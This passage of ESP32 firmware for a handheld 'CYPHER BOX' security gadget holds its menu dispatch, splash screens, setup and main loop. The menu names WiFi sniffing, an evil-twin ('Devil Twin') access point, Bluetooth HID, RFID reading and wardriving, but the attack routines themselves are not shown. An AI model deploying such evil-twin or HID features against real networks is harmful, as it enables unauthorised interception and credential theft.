      break;
    case STOP_AP:
      Serial.println("STOP AP button pressed");
      currentState = STATE_STOP_AP;
      handleStopServer();
      delay(2000);  // Scan for networks
      break;
    case STOP_SERVER:
      Serial.println("STOP SERVER button pressed");
      currentState = STATE_STOP_SERVER;
      handleStopServer();
      delay(2000);  // Scan for networks
      break;
    case BT_SCAN:
      Serial.println("BT SCAN button pressed");
      currentState = STATE_BT_SCAN;
      initBTScan();
      delay(2000);  // Scan for networks
      runBTScan();
      break;
    case BT_SERIAL_CMD:
      Serial.println("BT SCAN button pressed");
      currentState = STATE_BT_SERIAL;
      initBTSerialDisplay();
      delay(2000);
      initBTSerial();
      delay(2000);
      runBTSerial();
      while (currentState == STATE_BT_SERIAL) {
        runBTSerial();  // Check for Bluetooth commands
        // Add any other logic you need here
        delay(1000);  // Small delay to prevent excessive CPU usage
      }
      break;
    case BT_HID:
      Serial.println("BT HID button pressed");
      currentState = STATE_BT_HID;
      initBTHid();
      delay(2000);
      runBTHid();
      break;
    case DEVIL_TWIN:
      Serial.println("DEVIL TWIN button pressed");
      currentState = STATE_DEVIL_TWIN;
      initDevilTwin();
      delay(2000);
      runDevilTwin();
      break;
    case RFID:
      currentState = STATE_RFID;
      Serial.println("RFID button pressed");
      readRFID();
      break;
    case READ_BLOCKS:
      currentState = STATE_RFID;
      Serial.println("READ_BLOCKS button pressed");
      handleReadBlock();
      break;
    case WARDRIVER:
      Serial.println("WARDRIVER button pressed");
      currentState = STATE_WARDRIVER;
      runGPS();
      break;
    case PARTY_LIGHT:
      Serial.println("PARTYLIGHT button pressed");
      partyLight();
      delay(2000);
      break;
    case LIGHTOFF:
      Serial.println("LIGHTOFF button pressed");
      turnOffNeopixel();
      delay(2000);
      break;
  }
}
void displayTitleScreen() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);  // Use a larger font for the title
  u8g2_for_adafruit_gfx.setCursor(20, 40);                 // Centered vertically
  u8g2_for_adafruit_gfx.print("CYPHER BOX");
  // u8g2_for_adafruit_gfx.setCursor(centerX, 25); // Centered vertically
  // u8g2_for_adafruit_gfx.print("NETWORK PET");
  display.display();
}
void displayInfoScreen() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);  // Set back to small font
  u8g2_for_adafruit_gfx.setCursor(0, 22);
  u8g2_for_adafruit_gfx.print("Welcome to CYPHER BOX!");

  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("This is a cool cyber tool.");

  u8g2_for_adafruit_gfx.setCursor(0, 38);
  u8g2_for_adafruit_gfx.print("I perform analysis & attacks.");

  u8g2_for_adafruit_gfx.setCursor(0, 46);
  u8g2_for_adafruit_gfx.print("Insert a SD card to save!");

  u8g2_for_adafruit_gfx.setCursor(0, 54);
  u8g2_for_adafruit_gfx.print("Have fun & be safe ~_~;");

  display.display();
}
void setup() {
  Serial.begin(115200);
  delay(10);
  initDisplay();
  pinMode(UP_BUTTON_PIN, INPUT);
  pinMode(DOWN_BUTTON_PIN, INPUT);
  pinMode(SELECT_BUTTON_PIN, INPUT);
  pinMode(HOME_BUTTON_PIN, INPUT);
  pinMode(LED_PIN, OUTPUT);

  // Initialize U8g2_for_Adafruit_GFX
  u8g2_for_adafruit_gfx.begin(display);
  initRFID();
  delay(1000);
  initGPS();
  delay(1000);
  strip.begin();
  strip.setPixelColor(0, strip.Color(150, 0, 0));  // Bright red
  strip.show();                                    // Initialize all pixels to 'off'
  // Display splash screens
  /*displayTitleScreen();
    delay(2000); // Show title screen for 3 seconds
    displayInfoScreen();
    delay(2000); // Show info screen for 5 seconds
    */
  // Initial display
  drawMenu();
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();          // Remove any trailing newline or spaces
    handleCommand(command);  // Process the command
  }
  switch (currentState) {
    case STATE_MENU:
      handleMenuSelection();
      break;
    case STATE_WIFI_SNIFFER:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        currentState = STATE_MENU;
        // Clean up WiFi sniffer if necessary
        esp_wifi_set_promiscuous(false);
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_PACKET_MON:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_AP_SCAN:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_AP_JOIN:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_AP_CREATE:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_STOP_AP:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_STOP_SERVER:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_BT_SCAN:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        cleanupBTScan();
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_BT_SERIAL:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        cleanupBTScan();
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_BT_HID:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        cleanupBTScan();
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_DEVIL_TWIN:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        // wifi cleanup
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_RFID:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
    case STATE_READ_BLOCKS:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;

    case STATE_WARDRIVER:
      if (isButtonPressed(HOME_BUTTON_PIN)) {
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        return;
      }
      break;
  }
  if (serverRunning) {
    server.handleClient();
  }
}
